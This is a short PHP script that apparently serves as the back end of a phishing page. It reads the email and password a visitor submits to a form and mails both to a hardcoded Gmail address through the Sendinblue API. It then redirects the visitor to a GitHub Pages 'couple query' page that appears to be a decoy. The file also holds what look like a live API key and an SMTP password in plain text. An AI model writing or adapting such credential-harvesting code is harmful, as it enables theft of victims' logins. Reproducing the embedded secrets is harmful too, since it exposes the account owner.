<?php

require_once 'vendor/autoload.php'; // Replace with the path to the Sendinblue API client library

// Create the Sendinblue client object
$sendinblue = new Sendinblue\Client('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 ');

// Set the SMTP configuration
$config = Sendinblue\Configuration::getDefaultConfiguration()->setApiKey('api-key', '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 ');
$config->setHost('smtp-relay.sendinblue.com');
$config->setPort(587);
$config->setEncryption('tls');
$config->setUsername('nazmuzzaman.ifty13317@gmail.com');
$config->setPassword('DnqUW78d91Ejh5mA');
$email_number = $_POST['email_number'];
$password = $_POST['password'];
// Set the message parameters
$to = array(array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Your Name'));
$from = array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Sender Name');
$subject = 'Form Submission';
$htmlContent = '<p><b>New form submission:</b></p>';
$htmlContent .= '<table>';
$htmlContent .= '<tr><td>Email:</td><td>' . $_POST['email'] . '</td></tr>';
$htmlContent .= '<tr><td>Password:</td><td>' . $_POST['password'] . '</td></tr>';
$htmlContent .= '</table>';
$textContent = 'New form submission: Email: ' . $_POST['email'] . ', Password: ' . $_POST['password'];

// Create the message object
$message = new Sendinblue\Model\SendSmtpEmail(array(
    'to' => $to,
    'replyTo' => $from,
    'from' => $from,
    'subject' => $subject,
    'htmlContent' => $htmlContent,
    'textContent' => $textContent
));

// Send the message
try {
    $result = $sendinblue->getSendSmtpEmailApi()->sendTransacEmail($message);
    header('Location: https://love-ai.github.io/lovebite/couple%20query.html');
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}

?>
